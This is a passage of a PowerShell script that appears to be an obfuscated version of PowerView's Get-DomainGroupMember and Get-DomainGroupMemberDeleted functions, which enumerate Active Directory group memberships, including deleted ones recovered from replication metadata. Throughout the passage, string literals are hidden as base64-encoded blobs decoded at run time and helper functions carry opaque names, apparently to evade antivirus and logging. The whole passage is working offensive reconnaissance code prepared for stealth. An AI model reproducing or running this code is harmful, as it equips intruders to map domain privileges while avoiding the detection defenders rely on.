        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${390} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${390}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${390}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${390}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ${386} = f74 @48
        if (${386}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQBVAHMAaQBuAGcATQBhAHQAYwBoAGkAbgBnAFIAdQBsAGUA')))]) {
                ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
                ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                ${212} = f70 @48
                if (-not ${212}) {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAcwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHcAaQB0AGgAIABpAGQAZQBuAHQAaQB0AHkAOgAgACQASQBkAGUAbgB0AGkAdAB5AA==')))
                }
                else {
                    ${393} = ${212}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                    ${392} = ${212}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${394} = $Domain
                    }
                    else {
                        if (${392}) {
                            ${394} = ${392}.SubString(${392}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAATABEAEEAUAAgAG0AYQB0AGMAaABpAG4AZwAgAHIAdQBsAGUAIAB0AG8AIAByAGUAYwB1AHIAcwBlACAAbwBuACAAJwAkAHsAMwA5ADIAfQAnACwAIABvAG4AbAB5ACAAdQBzAGUAcgAgAGEAYwBjAG8AdQBuAHQAcwAgAHcAaQBsAGwAIABiAGUAIAByAGUAdAB1AHIAbgBlAGQALgA=')))
                    ${386}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoAG0AZQBtAGIAZQByAG8AZgA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AMQA5ADQAMQA6AD0AJAB7ADMAOQAyAH0AKQApAA==')))
                    ${386}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA==')))))
                    ${210} = ${386}.FindAll() | % {$_.Properties.distinguishedname[0]}
                }
                $Null = ${48}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA'))))
            }
            else {
                ${251} = ''
                $Filter = ''
                $Identity | ? {$_} | % {
                    ${252} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAyADUAMgB9ACkA')))
                    }
                    elseif (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${254} = ${252}.SubString(${252}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADIANQA0AH0AJwAgAGYAcgBvAG0AIAAnACQAewAyADUAMgB9ACcA')))
                            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${254}
                            ${386} = f74 @48
                            if (-not ${386}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsAMgA1ADQAfQAnAA==')))
                            }
                        }
                    }
                    elseif (${252} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                        ${253} = (([Guid]${252}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADIANQAzAH0AKQA=')))
                    }
                    elseif (${252}.Contains('\')) {
                        ${401} = ${252}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | f111 -f40 Canonical
                        if (${401}) {
                            ${46} = ${401}.SubString(0, ${401}.IndexOf('/'))
                            ${45} = ${252}.Split('\')[1]
                            ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsANAA1AH0AKQA=')))
                            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${46}
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADQANgB9ACcAIABmAHIAbwBtACAAJwAkAHsAMgA1ADIAfQAnAA==')))
                            ${386} = f74 @48
                        }
                    }
                    else {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                    }
                }
                if (${251} -and (${251}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewAyADUAMQB9ACkA')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${386}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $(${386}.filter)"
                try {
                    ${58} = ${386}.FindOne()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAcwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHcAaQB0AGgAIABpAGQAZQBuAHQAaQB0AHkAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAOgAgACQAXwA=')))
                    ${210} = @()
                }
                ${393} = ''
                ${392} = ''
                if (${58}) {
                    ${210} = ${58}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))))
                    if (${210}.count -eq 0) {
                        ${397} = $False
                        ${399} = 0
                        ${400} = 0
                        while (-not ${397}) {
                            ${400} = ${399} + 1499
                            ${398}=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAkAHsAMwA5ADkAfQAtACQAewA0ADAAMAB9AA==')))
                            ${399} += 1500
                            $Null = ${386}.PropertiesToLoad.Clear()
                            $Null = ${386}.PropertiesToLoad.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADMAOQA4AH0A'))))
                            $Null = ${386}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))
                            $Null = ${386}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))
                            try {
                                ${58} = ${386}.FindOne()
                                ${396} = ${58}.Properties.PropertyNames -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAqAA==')))
                                ${210} += ${58}.Properties.item(${396})
                                ${393} = ${58}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                                ${392} = ${58}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                                if (${210}.count -eq 0) {
                                    ${397} = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${397} = $True
                            }
                        }
                    }
                    else {
                        ${393} = ${58}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                        ${392} = ${58}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                        ${210} += ${58}.Properties.item(${396})
                    }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${394} = $Domain
                    }
                    else {
                        if (${392}) {
                            ${394} = ${392}.SubString(${392}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                }
            }
            ForEach (${204} in ${210}) {
                if (${f20} -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    ${395} = ${48}.Clone()
                    ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${204}
                    ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                    ${395}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAYwBuACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQALABvAGIAagBlAGMAdABjAGwAYQBzAHMA')))
                    $Object = f98 @395
                    $Properties = $Object.Properties
                }
                if ($Properties) {
                    ${389} = New-Object PSObject
                    ${389} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${394}
                    ${389} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${393}
                    ${389} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${392}
                    if ($Properties.objectsid) {
                        ${240} = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        ${240} = $Null
                    }
                    try {
                        ${387} = $Properties.distinguishedname[0]
                        if (${387} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBpAGcAbgBTAGUAYwB1AHIAaQB0AHkAUAByAGkAbgBjAGkAcABhAGwAcwB8AFMALQAxAC0ANQAtADIAMQA=')))) {
                            try {
                                if (-not ${240}) {
                                    ${240} = $Properties.cn[0]
                                }
                                ${391} = f111 -Identity ${240} -f40 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA'))) @390
                                if (${391}) {
                                    ${43} = ${391}.Split('@')[1]
                                }
                                else {
                                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewAzADgANwB9AA==')))
                                    ${43} = $Null
                                }
                            }
                            catch {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewAzADgANwB9AA==')))
                                ${43} = $Null
                            }
                        }
                        else {
                            ${43} = ${387}.SubString(${387}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    catch {
                        ${387} = $Null
                        ${43} = $Null
                    }
                    if ($Properties.samaccountname) {
                        ${42} = $Properties.samaccountname[0]
                    }
                    else {
                        try {
                            ${42} = f94 -438 $Properties.cn[0] @390
                        }
                        catch {
                            ${42} = $Properties.cn[0]
                        }
                    }
                    if ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))) {
                        ${388} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG0AcAB1AHQAZQByAA==')))
                    }
                    elseif ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))) {
                        ${388} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA==')))
                    }
                    elseif ($Properties.objectclass -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))) {
                        ${388} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgA=')))
                    }
                    else {
                        ${388} = $Null
                    }
                    ${389} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${43}
                    ${389} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${42}
                    ${389} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${387}
                    ${389} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATwBiAGoAZQBjAHQAQwBsAGEAcwBzAA=='))) ${388}
                    ${389} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAUwBJAEQA'))) ${240}
                    ${389}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAATQBlAG0AYgBlAHIA'))))
                    ${389}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQA=')))] -and ${387} -and (${388} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAATQBhAG4AdQBhAGwAbAB5ACAAcgBlAGMAdQByAHMAaQBuAGcAIABvAG4AIABnAHIAbwB1AHAAOgAgACQAewAzADgANwB9AA==')))
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${387}
                        $Null = ${48}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                        f85 @48
                    }
                }
            }
            ${386}.dispose()
        }
    }
}
function Get-DomainGroupMemberDeleted {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${48} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
            'LDAPFilter'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBnAHIAbwB1AHAAKQA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        f98 @48 | % {
            ${258} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${385} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) {
                ${384} = [xml]${385} | select -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA=='))) -ErrorAction SilentlyContinue
                if (${384}) {
                    if ((${384}.pszAttributeName -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA')))) -and ((${384}.dwVersion % 2) -eq 0 )) {
                        ${134} = New-Object PSObject
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQATgA='))) ${258}
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABOAA=='))) ${384}.pszObjectDn
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBGAGkAcgBzAHQAQQBkAGQAZQBkAA=='))) ${384}.ftimeCreated
                        ${134} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) ${384}.ftimeDeleted
